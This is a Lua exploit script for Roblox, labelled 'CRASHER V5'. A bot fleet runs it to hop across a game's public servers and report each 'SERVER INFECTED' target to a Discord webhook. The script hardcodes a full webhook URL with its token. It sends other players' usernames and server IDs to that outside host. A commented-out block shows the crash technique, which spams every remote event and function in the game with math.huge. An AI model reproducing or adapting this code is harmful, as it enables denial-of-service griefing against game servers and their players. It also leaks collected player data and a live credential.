-- CRASHER V5

getgenv().BRUH = tostring("https://discord.com/api/webhooks/1543254671999631524" .. "/qsip28YpqNYVX-O5WhAgorPnUHIbrPLT5YVVyNcp6TFBHhc-Z_nD5BXCK9iDSDqULbIJ")


local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local JobId = game.JobId
local PlaceId = game.PlaceId
local Players = game:GetService("Players")
local lp = game.Players.LocalPlayer
local Def = "RobloxKnightBOT_"
Def2 = "LeFrancaisScripter"
local max
local min
if lp.Name == tostring(Def.."1") then
  max = 19
  min = 17
elseif lp.Name == tostring(Def.."2") then
  max = 16
  min = 15
elseif lp.Name == tostring(Def.."3") then
  max = 14
  min = 13
elseif lp.Name == tostring(Def.."4") then
  max = 13
  min = 7
elseif lp.Name == tostring(Def.."8") then
max = 19
min = 6
elseif lp.Name == tostring(Def.."9") then
max = 17
min = 10
end
print(lp.Name)
local MMAX = math.random(min, max)
--local max = math.random(10, 19)
local settings = 5 -- best
local Teleportation_Failed = 0
local server_failed = false


getgenv().ServerHop = function()
coroutine.wrap(function()
if server_failed then
http.request({
            Url = BRUH,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone" .. "Teleportation Failed Reconnecting to a Recommended Server",
                username = game.Players.LocalPlayer.Name .. " Teleportation Failed"
            })
        })
end
end)()
local servers = {}
	local req = game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true")
	local body = HttpService:JSONDecode(req)

	if body and body.data then
		for i, v in next, body.data do
			if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
				table.insert(servers, 1, v.id)
			end
		end
	end

	if #servers > 0 then
		TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
	else
        server_failed = false
		warn("no server")
        task.delay(4,ServerHop)
	end
end


getgenv().HOPPING = function()
    if httprequest then
        local servers = {}
        local cursor = nil
        local foundServer = false

        repeat
            local url = string.format(
                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100&excludeFullGames=true%s",
                PlaceId,
                cursor and ("&cursor=" .. cursor) or ""
            )

            local success, req = pcall(function()
                return httprequest({ Url = url })
            end)

            if success and req then
                local body = HttpService:JSONDecode(req.Body)
                if body and body.data then
                    for _, a in pairs(body.data) do
                        if type(a) == "table" and tonumber(a.playing) and tonumber(a.maxPlayers) and a.playing >= min and a.playing <= max and a.id ~= JobId then
                           table.insert(servers, a.id)
                        end
                    end
                end

                cursor = body.nextPageCursor
            else
                warn("HTTP Request Error: " .. (req or "No response"))
                break
            end

        until not cursor or #servers >= 500

        if #servers > 0 then
            local success, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
            end)
            if not success then
                warn("Teleportation failed: " .. err)
                task.delay(2,HOPPING)
            end
        else
          Teleportation_Failed = Teleportation_Failed + 1
          print("failed " .. Teleportation_Failed)
           if Teleportation_Failed >= 15 then
           server_failed = true
            ServerHop()
            return
           end
            warn("No suitable servers found.")
            task.delay(4,HOPPING)
        end
    end
end

for i,v in next, game:GetService("Players"):GetPlayers() do
--coroutine.wrap(function()
if v ~= lp then
if string.find(v.Name,"RobloxKnightBOT_") then
coroutine.wrap(function()
local HttpService = game:GetService("HttpService")
 http.request({
            Url = BRUH,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. "Server Hopping Found" .. v.Name .. " In the same server.",
                username = game.Players.LocalPlayer.Name .. " ServerHop"
            })
        })
end)()
HOPPING()
end
end
--end)()
end

--[[coroutine.wrap(function()
	while task.wait() do
b=game:GetService("GuiService"):GetErrorCode()
if b ~= Enum.ConnectionError.OK then
local HttpService = game:GetService("HttpService")
 http.request({
            Url = BRUH,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. "Disconnected reconnecting soon...",
                username = game.Players.LocalPlayer.Name .. " Down"
            })
        })
	task.wait(2)
	HOPPING()
	break
end
end
end)()]]

--[[for i = 1, 5 do
    -- Start
    for p, v in pairs(game:GetDescendants()) do
        coroutine.wrap(function()
            local success, err = pcall(function()
                if v:IsA("RemoteFunction") then
                    v:InvokeServer(math.huge)
                elseif v:IsA("RemoteEvent") then
                    v:FireServer(math.huge)
                elseif v:IsA("BindableEvent") and v ~= Players.LocalPlayer.PlayerGui.Intro.LocalScript:FindFirstChild("DoTutorial") then
                    v:Fire(game.Players.LocalPlayer, math.huge)
                end
            end)
            if not success then
                warn(":neutral-face: " .. err)
            end
        end)()
    end
end]]

coroutine.wrap(function()
while task.wait(1) do
    if getgenv().start == true then
    task.wait(settings)
    coroutine.wrap(function()
        local HttpService = game:GetService("HttpService")
        local players = {}
    
        for _, player in ipairs(game.Players:GetPlayers()) do
            table.insert(players, player.Name)
        end
    
        local content = "🚨 SERVER INFECTED 🚨\n"
        content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
        content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
        content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
    
        http.request({
            Url = BRUH,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode({
                content = "@everyone " .. content .. " ".. game.JobId,
                username = game.Players.LocalPlayer.Name or "Crash Logger"
            })
        })
    end)()


HOPPING()
break
end
end
end)()
print("warn loaded")
print(HOPPING)
